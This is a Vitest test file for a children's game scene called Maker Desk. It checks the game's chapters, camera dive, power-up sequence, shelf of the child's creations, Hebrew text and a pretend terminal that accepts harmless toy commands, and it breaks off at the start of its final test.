/** Maker Desk through its real handlers, without a browser: the opening, the
 * three chapters (wake the bench, play inside the screen, talk to the
 * machine), the dive into the lid and the one step back, the power-up and the
 * finish, the child's own things on the shelf, and the pretend terminal as a
 * closed toy. Layout, the canvas, the particles and real audio are the
 * rendered check (Playwright). */
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { isValidElement, type ReactElement } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
type Slot = { value?: any; deps?: readonly unknown[]; cleanup?: () => void };
const h = vi.hoisted(() => ({ cursor: 0, slots: [] as Slot[], lang: 'en', name: 'Noa', kept: [] as unknown[], creationsFor: [] as string[], keys: [] as ((e: any) => void)[], reduced: false, shakes: 0, random: 0,
  audio: { key: vi.fn(), tok: vi.fn(), chime: vi.fn(), chord: vi.fn(), boop: vi.fn(), power: vi.fn(), beep: vi.fn(), hm: vi.fn(), fanfare: vi.fn(), note: vi.fn(), run: vi.fn(), drops: vi.fn(), woof: vi.fn(), chirp: vi.fn(),
    click: vi.fn(), glass: vi.fn(), song: vi.fn(), magic: vi.fn(), finale: vi.fn(), hum: vi.fn(), stop: vi.fn(), dispose: vi.fn() },
  sound: { tap: vi.fn(), pick: vi.fn(), place: vi.fn(), back: vi.fn(), chapter: vi.fn(), setPiece: vi.fn(), ambience: vi.fn(), note: vi.fn(), breath: vi.fn(), stop: vi.fn(), dispose: vi.fn() } }));
vi.mock('react', async original => {
  const actual = await original<typeof import('react')>();
  return { ...actual,
    useState(initial: any) { const slot = h.slots[h.cursor++] ??= { value: typeof initial === 'function' ? initial() : initial }; return [slot.value, (next: any) => { slot.value = typeof next === 'function' ? next(slot.value) : next; }]; },
    useRef(initial: any) { return (h.slots[h.cursor++] ??= { value: { current: initial } }).value; },
    useEffect(effect: () => void | (() => void), deps: readonly unknown[]) {
      const index = h.cursor++, old = h.slots[index];
      if (old?.deps && old.deps.length === deps.length && old.deps.every((v, i) => Object.is(v, deps[i]))) return;
      old?.cleanup?.(); const slot = h.slots[index] = { deps } as Slot; slot.cleanup = effect() || undefined;
    },
  };
});
vi.mock('../../../../../../context/LanguageContext', () => ({ useLanguage: () => ({ uiLang: h.lang }) }));
vi.mock('../../../../../../context/ArborContext', () => ({ useArborOptional: () => ({ childProfile: { id: 'child-a', age: 7 } }) }));
vi.mock('../../../../../../lib/native', () => ({ selectionHaptic: async () => {} }));
vi.mock('../../../../game/GameShell', () => ({ GameShell: () => null, GameFinish: () => null }));
vi.mock('../../../../audio/kidAudio', () => ({ useKidReadAloudMuted: () => false, onKidHush: () => () => {}, kidAudioAllowed: () => false, kidAudioContext: () => null }));
vi.mock('../../../studioCopy', () => ({ studioCopy: (lang: string) => lang === 'he' ? { hello: 'היי', helloNoName: 'היי!' } : { hello: 'Hi', helloNoName: 'Hi there!' } }));
vi.mock('../../../studioCreations', () => ({ useStudioCreations: (childId: string) => { h.creationsFor.push(childId); return { items: h.kept, loaded: true, isCurrent: () => true }; } }));
vi.mock('../../../StudioCreationResult', () => ({ CreationPreview: () => null }));
vi.mock('../../../StudioMakerArt', () => ({ StudioMakerPreview: () => null, isMakerCreation: (c: { kind: string }) => ['bowl', 'textile', 'bottle'].includes(c.kind) }));
vi.mock('../../../useStudioHero', () => ({ useStudioHero: () => ({ name: h.name }) }));
vi.mock('./deskAudio', () => ({ createDeskAudio: () => h.audio }));
// The shared play kit is the stage and the HUD; here its pieces are plain markers, so the tree can be walked.
vi.mock('../play', () => ({
  PlayStage: () => null, PlayFx: () => null, HudCoach: () => null, HudQuest: () => null, HudDock: () => null, HudButton: () => null, HudToast: () => null, PlayOpening: () => null, PlaySetPiece: () => null,
  CAMERA_HOME: { x: 0.5, y: 0.5, zoom: 1 }, createPlaySound: () => h.sound, hitPause: async () => {}, prefersReducedMotion: () => h.reduced, roundSeed: () => 7, seededRandom: () => () => h.random,
  useShake: () => [h.shakes, () => { h.shakes++; }],
}));
import MakerDesk, { WAIT_MS } from './MakerDesk';
import { CreationPreview } from '../../../StudioCreationResult';
import { HudButton, HudCoach, HudQuest, HudToast, PlayOpening, PlaySetPiece, PlayStage } from '../play';
import { DESK_KIT, LID_GLASS } from './deskKit';
import { DeskBounce } from './DeskBounce';
import { DeskTerminal } from './DeskTerminal';
import { GameFinish } from '../../../../game/GameShell';
import { HERO_NAME_FALLBACK } from '../../../../../../lib/heroNameFallback';
import { MAKER_DESK_COPY } from './makerDeskCopy';
import { POWER_UP, POWER_UP_REDUCED, TOOLS } from './makerDeskRules';

type Props = { children?: unknown; world?: unknown; onClick?: (e?: any) => void; [key: string]: any };
/** Every element in the tree: children, and the stage's `world` (the scene the camera moves). */
function nodes(node: unknown): ReactElement<Props>[] { if (Array.isArray(node)) return node.flatMap(nodes); if (!isValidElement<Props>(node)) return []; return [node, ...nodes(node.props.world), ...nodes(node.props.children)]; }
function words(node: unknown): string { if (typeof node === 'string') return node; if (Array.isArray(node)) return node.map(words).join(''); if (isValidElement<Props>(node)) return words(node.props.children); return ''; }
const render = () => { h.cursor = 0; return MakerDesk(); };
const find = (tree: unknown, test: (n: ReactElement<Props>) => boolean, what: string) => { const found = nodes(tree).find(test); expect(found, what).toBeDefined(); return found!; };
const has = (tree: unknown, test: (n: ReactElement<Props>) => boolean) => nodes(tree).some(test);
const spot = (tree: unknown, name: string) => find(tree, n => n.props['data-spot'] === name, `spot ${name}`);
const tool = (tree: unknown, name: string) => find(tree, n => n.props['data-tool'] === name, `tool ${name}`);
const icon = (tree: unknown, program: string) => find(tree, n => n.props.className === 'md-icon' && n.props['data-program'] === program, `icon ${program}`);
const section = (tree: unknown) => find(tree, n => n.props['data-adventure'] === 'maker-desk', 'section');
const room = (tree: unknown) => find(tree, n => n.props.className === 'md-room', 'the room');
const stage = (tree: unknown) => find(tree, n => n.type === PlayStage, 'stage');
const coach = (tree: unknown) => find(tree, n => n.type === HudCoach, 'coach').props;
const quest = (tree: unknown) => (find(tree, n => n.type === HudQuest, 'quest').props.steps as { key: string; done: boolean; label: string }[]);
const toast = (tree: unknown) => { const node = find(tree, n => n.type === HudToast, 'toast'); return node.props.show ? words(node.props.children) : ''; };
const dock = (tree: unknown, key: string) => nodes(tree).find(n => n.type === HudButton && n.props.data && key in n.props.data);
const backButton = (tree: unknown) => { const found = dock(tree, 'data-back-to'); expect(found, 'back button').toBeDefined(); return found!; };
const en = MAKER_DESK_COPY.en;
const escape = () => { for (const fn of h.keys) fn({ key: 'Escape' }); };

beforeEach(() => {
  h.slots = []; h.lang = 'en'; h.name = 'Noa'; h.kept = []; h.creationsFor = []; h.keys = []; h.reduced = false; h.shakes = 0; h.random = 0;
  Object.values(h.audio).forEach(fn => fn.mockClear()); Object.values(h.sound).forEach(fn => fn.mockClear());
  vi.useFakeTimers();
  vi.stubGlobal('window', { matchMedia: () => ({ matches: h.reduced }), addEventListener: (type: string, fn: any) => { if (type === 'keydown') h.keys.push(fn); }, removeEventListener: (_: string, fn: any) => { h.keys = h.keys.filter(k => k !== fn); } });
  vi.stubGlobal('document', { visibilityState: 'visible', addEventListener: vi.fn(), removeEventListener: vi.fn() });
});
afterEach(() => { vi.useRealTimers(); vi.unstubAllGlobals(); });

/** Past the opening shot: the title card hands over to play. */
function begin() { find(render(), n => n.type === PlayOpening, 'opening').props.onDone(); const tree = render(); expect(section(tree).props['data-phase']).toBe('play'); return tree; }
/** Chapter one: three different tools wake the bench. */
function wake(tools: readonly string[] = ['proofLens', 'leafLab', 'clearPatch']) { for (const id of tools) tool(render(), id).props.onClick!(); return render(); }
/** Room → inside the screen: touch the woken lid and let the camera push in. */
function dive() { spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(700); const tree = render(); expect(section(tree).props['data-level']).toBe('desktop'); return tree; }

describe('Maker Desk', () => {
  it('opens on a title shot with the host’s line; a tap skips it, and nothing in the room is in play until then', () => {
    let tree = render();
    expect(section(tree).props['data-phase']).toBe('opening'); expect(section(tree).props['data-level']).toBe('study');
    const opening = find(tree, n => n.type === PlayOpening, 'opening');
    expect(opening.props.title).toBe(en.title); expect(opening.props.place).toBe(en.place); expect(coach(tree).line).toBe(en.opening); expect(coach(tree).who).toBe('chock');
    // The camera starts on the valley through the windows and settles on the bench by a timer.
    expect(stage(tree).props.camera.zoom).toBeGreaterThan(1); vi.advanceTimersByTime(100); expect(stage(render()).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
    tool(render(), 'proofLens').props.onClick!(); spot(render(), 'pc').props.onClick!(); tree = render();
    expect(quest(tree).every(step => !step.done)).toBe(true); expect(room(tree).props['data-power']).toBe('asleep');
    tree = begin();
    expect(has(tree, n => n.type === PlayOpening)).toBe(false); expect(coach(tree).line).toBe(en.wakeCue);
    expect(quest(tree).map(step => step.label)).toEqual([en.chapters.wake, en.chapters.play, en.chapters.ask]);
  });
  it('the whole scene is the stage, and every thing in it is a real, named button', () => {
    const tree = begin();
    expect(stage(tree).props.id).toBe('maker-desk'); expect((section(tree).props.children as ReactElement).type).toBe(PlayStage);
    const buttons = nodes(tree).filter(n => n.type === 'button');
    expect(buttons.filter(n => n.props['data-spot']).map(n => n.props['data-spot']).sort()).toEqual(['chock', 'flower', 'lamp', 'pc', 'powerBar', 'shelf', 'tile-0', 'tile-1', 'tile-2', 'window']);
    expect(buttons.filter(n => n.props['data-tool']).map(n => n.props['data-tool'])).toEqual([...TOOLS]);
    for (const button of buttons) expect(typeof button.props['aria-label'] === 'string' && button.props['aria-label'].length > 2, JSON.stringify(button.props.className)).toBe(true);
    // No form furniture: no labelled groups of options, no lists, no tabs.
    expect(has(tree, n => ['ul', 'ol', 'li', 'select', 'label', 'fieldset'].includes(n.type as string) || n.props.role === 'tab' || n.props.role === 'radio')).toBe(false);
  });
  it('chapter one: the sleeping screen only stirs; three different tools wake the bench, each doing its one thing', () => {
    begin();
    spot(render(), 'pc').props.onClick!(); let tree = render();
    expect(section(tree).props['data-level']).toBe('study'); expect(toast(tree)).toBe(en.screenAsleep); expect(h.sound.back).toHaveBeenCalledTimes(1); expect(coach(tree).mood).toBe('curious');
    // ProofLens keeps a true picture.
    tool(tree, 'proofLens').props.onClick!(); tree = render();
    expect(toast(tree)).toBe(en.toolDo.proofLens); expect(has(tree, n => n.props.className === 'md-snap')).toBe(true); expect(tool(tree, 'proofLens').props['data-on']).toBe(true);
    expect(room(tree).props['data-power']).toBe('stirring'); expect(coach(tree).line).toBe(en.wakeMore); expect(h.sound.place).toHaveBeenCalledTimes(1);
    // The same tool again is play, not progress.
    tool(tree, 'proofLens').props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.wakeMore); expect(h.sound.pick).toHaveBeenCalledTimes(1);
    // ViewCheck shows the room from lower down, then the camera comes home.
    tool(tree, 'viewCheck').props.onClick!(); tree = render();
    expect(toast(tree)).toBe(en.toolDo.viewCheck); expect(stage(tree).props.camera.y).toBeGreaterThan(0.7); expect(coach(tree).line).toBe(en.wakeLast);
    vi.advanceTimersByTime(1800); expect(stage(render()).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
    expect(quest(render())[0].done).toBe(false); expect(h.audio.power).not.toHaveBeenCalled();
    // PulsePod: amber, everything waits; then cyan by itself. The third tool wakes the bench.
    tool(render(), 'pulsePod').props.onClick!(); tree = render();
    expect(toast(tree)).toBe(en.toolDo.pulsePodWait); expect(room(tree).props['data-paused']).toBe(true); expect(tool(tree, 'pulsePod').props['data-state']).toBe('wait');
    expect(quest(tree)[0].done).toBe(true); expect(room(tree).props['data-power']).toBe('awake'); expect(h.audio.power).toHaveBeenCalledTimes(1); expect(h.sound.chapter).toHaveBeenCalledTimes(1); expect(h.shakes).toBe(1);
    expect(coach(tree).line).toBe(en.screenAwake); expect(coach(tree).mood).toBe('wow');
    vi.advanceTimersByTime(WAIT_MS + 50); tree = render(); expect(room(tree).props['data-paused']).toBe(false); expect(toast(tree)).toBe(en.toolDo.pulsePodReady);
    // LeafLab reads the plant; ClearPatch leaves a seam that shows.
    tool(tree, 'leafLab').props.onClick!(); expect(toast(render())).toBe(en.toolDo.leafLabDry);
    tool(render(), 'clearPatch').props.onClick!(); tree = render(); expect(toast(tree)).toBe(en.toolDo.clearPatch); expect(has(tree, n => n.props.className === 'md-lid__seam')).toBe(true);
    expect(h.sound.chapter).toHaveBeenCalledTimes(1);
  });
  it('the toys answer: the planter drinks and blooms, the lamp, the windows, Chock and the music pads respond', () => {
    begin();
    const planter = () => spot(render(), 'flower');
    expect(planter().props['data-stage']).toBe(0);
    planter().props.onClick!(); expect(toast(render())).toBe(en.plantGrow); expect(h.audio.drops).toHaveBeenLastCalledWith(false);
    planter().props.onClick!(); planter().props.onClick!();
    expect(planter().props['data-stage']).toBe(3); expect(toast(render())).toBe(en.plantBloom); expect(h.audio.drops).toHaveBeenLastCalledWith(true);
    planter().props.onClick!(); expect(planter().props['data-stage']).toBe(3); expect(toast(render())).toBe(en.plantHappy);
    tool(render(), 'leafLab').props.onClick!(); expect(toast(render())).toBe(en.toolDo.leafLabGood);
    spot(render(), 'lamp').props.onClick!(); let tree = render();
    expect(section(tree).props['data-light']).toBe('evening'); expect(spot(tree, 'lamp').props['aria-pressed']).toBe(true); expect(stage(tree).props.grade).toBe('dusk');
    spot(tree, 'lamp').props.onClick!(); expect(stage(render()).props.grade).toBe('day');
    spot(render(), 'window').props.onClick!(); tree = render(); expect(spot(tree, 'window').props['aria-pressed']).toBe(false); expect(spot(tree, 'window').props['data-frost']).toBe(true);
    spot(tree, 'chock').props.onClick!(); expect(h.audio.woof).toHaveBeenCalledTimes(1); expect(toast(render())).toBe(en.chockPat);
    expect(spot(render(), 'chock').props['data-mood']).toBe('glad'); vi.advanceTimersByTime(2500); expect(spot(render(), 'chock').props['data-mood']).toBe('watch');
    spot(render(), 'tile-1').props.onClick!(); expect(h.audio.note).toHaveBeenLastCalledWith(7);
    spot(render(), 'shelf').props.onClick!(); tree = render(); expect(spot(tree, 'shelf').props['aria-pressed']).toBe(true); expect(toast(tree)).toBe(en.thingsEmpty);
  });
  it('shows the first touch with a ghost hand: a tool first, then the woken screen, and never again after the dive', () => {
    begin();
    const hand = () => nodes(render()).find(n => n.props.className === 'md-ghost')?.props['data-for'] ?? null;
    expect(hand()).toBeNull(); vi.advanceTimersByTime(2300); expect(hand()).toBe('tool');
    for (const fn of h.keys) fn({ key: 'Tab' }); expect(hand()).toBeNull();
    vi.advanceTimersByTime(5900); expect(hand()).toBeNull(); vi.advanceTimersByTime(200); expect(hand()).toBe('tool');
    wake(); expect(hand()).toBeNull(); vi.advanceTimersByTime(2300); expect(hand()).toBe('lid');
    dive(); expect(hand()).toBeNull();
    backButton(render()).props.onClick!(); vi.advanceTimersByTime(9000); expect(section(render()).props['data-level']).toBe('study'); expect(hand()).toBeNull();
  });
  it('touching the woken lid pushes the camera into it until the glass is the whole display; one step brings it back', () => {
    begin(); wake();
    spot(render(), 'pc').props.onClick!(); let tree = render();
    expect(room(tree).props['data-diving']).toBe(true); expect(stage(tree).props.camera.zoom).toBe(3); expect(section(tree).props['data-level']).toBe('study');
    spot(tree, 'pc').props.onClick!(); vi.advanceTimersByTime(700); tree = render();
    expect(section(tree).props['data-level']).toBe('desktop'); expect(has(tree, n => n.props.className === 'md-glass')).toBe(true); expect(stage(tree).props.parallax).toBe(false);
    expect(backButton(tree).props.data['data-back-to']).toBe('study'); expect(backButton(tree).props.label).toBe(en.toDesk);
    icon(tree, 'bounce').props.onClick!(); tree = render();
    expect(section(tree).props['data-program']).toBe('bounce'); expect(backButton(tree).props.data['data-back-to']).toBe('desktop');
    expect(nodes(tree).filter(n => n.props['data-control']).map(n => n.props['data-control'])).toEqual(['left', 'right']);
    backButton(tree).props.onClick!(); expect(section(render()).props['data-level']).toBe('desktop');
    icon(render(), 'ask').props.onClick!(); escape(); expect(section(render()).props['data-level']).toBe('desktop');
    escape(); tree = render();
    expect(section(tree).props['data-level']).toBe('study'); expect(stage(tree).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 }); expect(has(tree, n => n.props.className === 'md-glass')).toBe(false);
    escape(); expect(section(render()).props['data-level']).toBe('study');
  });
  it('the computer target fits its visible glass and keeps the camera aimed at the original bench position', () => {
    begin(); const tree = wake();
    const pc = spot(tree, 'pc'), style = pc.props.style;
    const left = parseFloat(style.left), top = parseFloat(style.top), width = parseFloat(style.width), height = parseFloat(style.height);
    const points = LID_GLASS.split(',').map(pair => pair.trim().split(' ').map(parseFloat));
    const local = style.clipPath.slice('polygon('.length, -1).split(',').map((pair: string) => pair.trim().split(' ').map(parseFloat));
    const centre = [left + width / 2, top + height / 2];
    // The target centre must be inside all four edges of the convex glass,
    // while its normalized clip must still cover exactly the original art.
    points.forEach(([x, y], index) => {
      const [nextX, nextY] = points[(index + 1) % points.length];
      expect((nextX - x) * (centre[1] - y) - (nextY - y) * (centre[0] - x)).toBeGreaterThan(0);
      expect(left + local[index][0] * width / 100).toBeCloseTo(x, 5);
      expect(top + local[index][1] * height / 100).toBeCloseTo(y, 5);
    });
    const bench = find(tree, n => n.props.className === 'md-bench', 'bench');
    bench.props.ref.current = { getBoundingClientRect: () => ({ left: 220, top: 240, width: 680, height: 485 }) };
    room(tree).props.ref.current = { getBoundingClientRect: () => ({ left: 100, top: 40, width: 1000, height: 600 }) };
    pc.props.onClick!();
    const camera = stage(render()).props.camera;
    expect(camera.x).toBeCloseTo((220 + 680 * .583 - 100) / 1000);
    expect(camera.y).toBeCloseTo((240 + 485 * .162 - 40) / 600);
    expect(camera.zoom).toBe(3);
  });
  it('chapters two and three, then the power-up: every tool lights in turn, the room joins in, ProofLens keeps the picture, and only then the finish', () => {
    begin(); wake(); let tree = dive();
    expect(coach(tree).line).toBe(en.playCue); expect(icon(tree, 'bounce').props['data-next']).toBe(true);
    icon(tree, 'bounce').props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.bounceCue);
    const bounce = find(tree, n => n.type === DeskBounce, 'bounce');
    bounce.props.onMoment('chain'); expect(toast(render())).toBe(en.chain);
    bounce.props.onAllLit(); bounce.props.onAllLit(); tree = render();
    expect(quest(tree).map(step => step.done)).toEqual([true, true, false]); expect(h.sound.chapter).toHaveBeenCalledTimes(2); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined();
    bounce.props.onGlowing(true); expect(dock(render(), 'data-control')!.props.label).toBe(en.again);
    backButton(render()).props.onClick!(); tree = render(); expect(coach(tree).line).toBe(en.askCue); expect(icon(tree, 'ask').props['data-next']).toBe(true); expect(icon(tree, 'bounce').props['data-done']).toBe(true);
    icon(tree, 'ask').props.onClick!(); tree = render();
    const term = find(tree, n => n.type === DeskTerminal, 'ask');
    term.props.onCommand('help'); term.props.onCommand('help'); term.props.onCommand(null); tree = render();
    expect(quest(tree)[2].done).toBe(false); expect(coach(tree).line).toBe(en.askOne);
    term.props.onCommand('ls'); tree = render();
    expect(quest(tree).every(step => step.done)).toBe(true); expect(coach(tree).line).toBe(en.allDone); expect(h.sound.chapter).toHaveBeenCalledTimes(3);
    vi.advanceTimersByTime(500); expect(h.audio.fanfare).toHaveBeenCalledTimes(1);
    expect(has(render(), n => n.type === GameFinish)).toBe(false);
    // The one primary action: Power up. From inside the screen it pulls the camera back out first.
    const power = dock(render(), 'data-maker-desk-power')!; expect(power.props.tone).toBe('go'); expect(power.props.label).toBe(en.powerUp);
    // It is the only action with a word on it now: the step back keeps its place as an arrow.
    expect(backButton(render()).props.iconOnly).toBe(true); expect(nodes(render()).filter(n => n.type === HudButton && n.props.tone === 'go')).toHaveLength(1);
    power.props.onClick!(); tree = render();
    expect(section(tree).props['data-level']).toBe('study'); expect(section(tree).props['data-phase']).toBe('powerUp'); expect(find(tree, n => n.type === PlaySetPiece, 'set-piece').props.active).toBe(true);
    expect(room(tree).props['data-beat']).toBe(1); expect(TOOLS.map(id => tool(tree, id).props['data-on'])).toEqual([false, false, false, false, false]); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined();
    // The tools light one after another, left to right for this seed.
    vi.advanceTimersByTime(POWER_UP.tools + 10); expect(TOOLS.map(id => tool(render(), id).props['data-on'])).toEqual([true, false, false, false, false]);
    vi.advanceTimersByTime(POWER_UP.toolGap * 2); expect(TOOLS.map(id => tool(render(), id).props['data-on'])).toEqual([true, true, true, false, false]);
    vi.advanceTimersByTime(POWER_UP.screen - POWER_UP.tools - POWER_UP.toolGap * 2); tree = render();
    expect(TOOLS.every(id => tool(tree, id).props['data-on'])).toBe(true); expect(room(tree).props['data-beat']).toBe(2); expect(h.sound.setPiece).toHaveBeenCalledTimes(1);
    vi.advanceTimersByTime(POWER_UP.room - POWER_UP.screen); tree = render();
    expect(room(tree).props['data-beat']).toBe(3); expect(h.audio.finale).toHaveBeenCalledTimes(1); expect(spot(tree, 'flower').props['data-stage']).toBe(3); expect(spot(tree, 'chock').props['data-mood']).toBe('wow');
    expect(stage(tree).props.camera).toEqual({ x: 0.5, y: 0.5, zoom: 1 });
    vi.advanceTimersByTime(POWER_UP.picture - POWER_UP.room); tree = render();
    expect(room(tree).props['data-beat']).toBe(4); expect(has(tree, n => n.props.className === 'md-keepsake')).toBe(true); expect(find(tree, n => n.type === PlaySetPiece, 'set-piece').props.caption).toBe(en.powerPicture);
    vi.advanceTimersByTime(POWER_UP.end - POWER_UP.picture - 100); expect(has(render(), n => n.type === GameFinish)).toBe(false);
    vi.advanceTimersByTime(200);
    const finish = find(render(), n => n.type === GameFinish, 'finish');
    expect(finish.props.creation).toBeUndefined(); expect(finish.props.title).toBe(en.finish);
  });
  it('the chapters may be met in any order, the power-up waits for all three, and it can start from the bench itself', () => {
    begin(); wake(); let tree = dive();
    icon(tree, 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask');
    // The secret word thrills the host and never counts for more than a word.
    term.props.onCommand('abracadabra'); expect(coach(render()).mood).toBe('wow'); expect(quest(render())[2].done).toBe(false);
    term.props.onCommand('dance'); tree = render();
    expect(quest(tree).map(step => step.done)).toEqual([true, false, true]); expect(dock(tree, 'data-maker-desk-power')).toBeUndefined(); expect(coach(tree).line).toBe(en.freePlay);
    escape(); escape(); tree = render(); expect(coach(tree).line).toBe(en.roomPlay); expect(spot(tree, 'powerBar').props.disabled).toBe(true);
    spot(tree, 'powerBar').props.onClick!(); expect(section(render()).props['data-phase']).toBe('play');
    dive(); icon(render(), 'bounce').props.onClick!(); find(render(), n => n.type === DeskBounce, 'bounce').props.onAllLit();
    escape(); escape(); tree = render();
    expect(spot(tree, 'powerBar').props.disabled).toBe(false); expect(spot(tree, 'powerBar').props['data-ready']).toBe(true);
    spot(tree, 'powerBar').props.onClick!(); expect(section(render()).props['data-phase']).toBe('powerUp');
  });
  it('with motion reduced the dive and the power-up are short cuts on the same timers, and play is whole', () => {
    h.reduced = true; begin(); wake();
    spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(120); expect(section(render()).props['data-level']).toBe('desktop');
    icon(render(), 'bounce').props.onClick!(); find(render(), n => n.type === DeskBounce, 'bounce').props.onAllLit();
    backButton(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask'); term.props.onCommand('help'); term.props.onCommand('ls');
    dock(render(), 'data-maker-desk-power')!.props.onClick!();
    vi.advanceTimersByTime(POWER_UP_REDUCED.end - 100); expect(has(render(), n => n.type === GameFinish)).toBe(false);
    vi.advanceTimersByTime(200); expect(has(render(), n => n.type === GameFinish)).toBe(true);
  });
  it('shows only the current child’s things: as objects on the shelf, and as files in the terminal', () => {
    h.kept = [{ id: 'bowl', creation: { kind: 'bowl', glaze: 'rose', pattern: 0, seams: [3, 2, 1, 0] } }, { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }];
    let tree = begin();
    expect(h.creationsFor.every(id => id === 'child-a')).toBe(true);
    expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').map(n => n.props['data-kind'])).toEqual(['bowl', 'dance', 'empty', 'empty', 'empty', 'empty']);
    expect(nodes(tree).filter(n => n.props['data-shelf-thing']).map(n => n.type)).toEqual(['button', 'button']);
    wake(); tree = dive();
    // Inside the screen there are two programs; the things are not a list there.
    expect(nodes(tree).filter(n => n.props.className === 'md-icon').map(n => n.props['data-program'])).toEqual(['bounce', 'ask']);
    icon(tree, 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask');
    expect(term.props.things).toEqual(['bowl', 'dance']); expect(term.props.hello).toEqual({ word: 'Hi', noName: 'Hi there!', name: 'Noa' });
  });
  it('a thing on the shelf can be looked at large, and one that is new since last time is noticed', () => {
    const bowl = (glaze: string) => ({ id: 'bowl', creation: { kind: 'bowl', glaze, pattern: 0, seams: [3, 2, 1, 0] } });
    const place = (tree: unknown) => find(tree, n => n.props.className === 'md-shelf__place' && n.props['data-kind'] === 'bowl', 'bowl place');
    h.kept = [bowl('rose')]; begin();
    vi.advanceTimersByTime(3500); let tree = render();
    expect(place(tree).props['data-fresh']).toBe(false);
    find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); tree = render();
    const shown = find(tree, n => n.props.className === 'md-show', 'looked at');
    expect(nodes(shown).filter(n => n.type === CreationPreview).map(n => n.props.creation.kind)).toEqual(['bowl']);
    escape(); tree = render(); expect(has(tree, n => n.props.className === 'md-show')).toBe(false); expect(section(tree).props['data-level']).toBe('study');
    // The same child comes back to the desk later in the sitting with the bowl made again, and a new dance.
    h.slots = []; h.kept = [bowl('indigo'), { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }]; begin();
    vi.advanceTimersByTime(3500); tree = render();
    expect(place(tree).props['data-fresh']).toBe(true);
    expect(toast(tree)).toBe('New on the shelf: Your mended bowl, Your dance!');
    find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); expect(place(render()).props['data-fresh']).toBe(false);
  });
  it('CrewLink shows who is around: Chock always, and one friend who dropped by', () => {
    begin(); wake(); const tree = dive();
    const dots = nodes(tree).filter(n => n.props.className === 'md-crew__dot');
    expect(dots.map(n => n.props['data-crew'])).toEqual(['bebe', 'gobgob', 'chock', 'pep', 'aya']);
    expect(dots.find(n => n.props['data-crew'] === 'chock')!.props['data-here']).toBe(true);
    expect(dots.filter(n => n.props['data-here']).length).toBeGreaterThanOrEqual(2);
    dots.find(n => n.props['data-crew'] === 'pep')!.props.onClick!();
    expect(toast(render())).toBe(en.crewAway.pep);
  });
  it('a seed changes the sitting: the first lanterns, the hinted tool and the order of the power-up', () => {
    h.random = 0.99; begin();
    vi.advanceTimersByTime(2300);
    const hand = find(render(), n => n.props.className === 'md-ghost', 'hand');
    expect(hand.props.style.insetInlineStart).toBe('71%');
    wake(); dive(); icon(render(), 'bounce').props.onClick!();
    const bounce = find(render(), n => n.type === DeskBounce, 'bounce');
    expect(bounce.props.firstLayout).toBe('zigzag'); bounce.props.onAllLit();
    backButton(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask'); expect(term.props.riddle).toBe(4); term.props.onCommand('help'); term.props.onCommand('ls');
    dock(render(), 'data-maker-desk-power')!.props.onClick!(); vi.advanceTimersByTime(POWER_UP.tools + 10);
    // Middle out for this seed: PulsePod lights first.
    expect(TOOLS.filter(id => tool(render(), id).props['data-on'])).toEqual(['pulsePod']);
  });
  it('an empty shelf waits kindly, and the machine greets without a name by the Studio convention', () => {
    h.name = HERO_NAME_FALLBACK; let tree = begin();
    expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').every(n => n.props['data-kind'] === 'empty')).toBe(true);
    expect(spot(tree, 'shelf').props['aria-label']).toBe(`${en.shelfEmpty}. ${en.shelfTag}`);
    wake(); tree = dive(); icon(tree, 'ask').props.onClick!();
    expect(find(render(), n => n.type === DeskTerminal, 'ask').props.hello.name).toBeNull();
  });
  it('carries every word in Hebrew', () => {
    const he = MAKER_DESK_COPY.he;
    const shape = (value: unknown): unknown => Array.isArray(value) ? value.map(shape) : value && typeof value === 'object' ? Object.fromEntries(Object.entries(value).map(([k, v]) => [k, shape(v)])) : typeof value;
    expect(shape(he)).toEqual(shape(en));
    for (const key of ['title', 'description', 'instruction'] as const) { expect(he[key]).toMatch(/[֐-׿]/); expect(he[key]).not.toMatch(/[A-Za-z]/); }
    h.lang = 'he'; let tree = render();
    expect(section(tree).props.dir).toBe('rtl'); expect(coach(tree).line).toBe(he.opening); expect(find(tree, n => n.type === PlayOpening, 'opening').props.place).toBe(he.place);
    tree = begin(); expect(coach(tree).line).toBe(he.wakeCue); expect(quest(tree).map(step => step.label)).toEqual([he.chapters.wake, he.chapters.play, he.chapters.ask]);
    // The scene itself is never mirrored: the room keeps its own left and right.
    expect(room(tree).props.dir).toBe('ltr');
    // And the paddle's arrows stay physically left and right in the right-to-left HUD.
    wake(); dive(); icon(render(), 'bounce').props.onClick!();
    expect(nodes(render()).filter(n => n.props['data-control']).map(n => n.props['data-control'])).toEqual(['right', 'left']);
  });
  it('every line the host says is eight words or fewer, in both languages', () => {
    for (const w of [en, MAKER_DESK_COPY.he]) for (const cue of [w.opening, w.wakeCue, w.wakeMore, w.wakeLast, w.screenAsleep, w.screenAwake, w.playCue, w.askCue, w.roomAsk, w.roomPlay, w.askOne, w.allDone, w.freePlay, w.desktopCue, w.bounceCue,
      w.terminalCue, w.roomEvening, w.powerCaption, w.powerPicture, w.chain, w.allLit]) expect(cue.split(/\s+/).length, cue).toBeLessThanOrEqual(8);
  });
  it('stages the desk on kit pictures only: shipped art, the shared library and four edits of kit renders, none of them showing a child', () => {
    const pictures = Object.values(DESK_KIT);
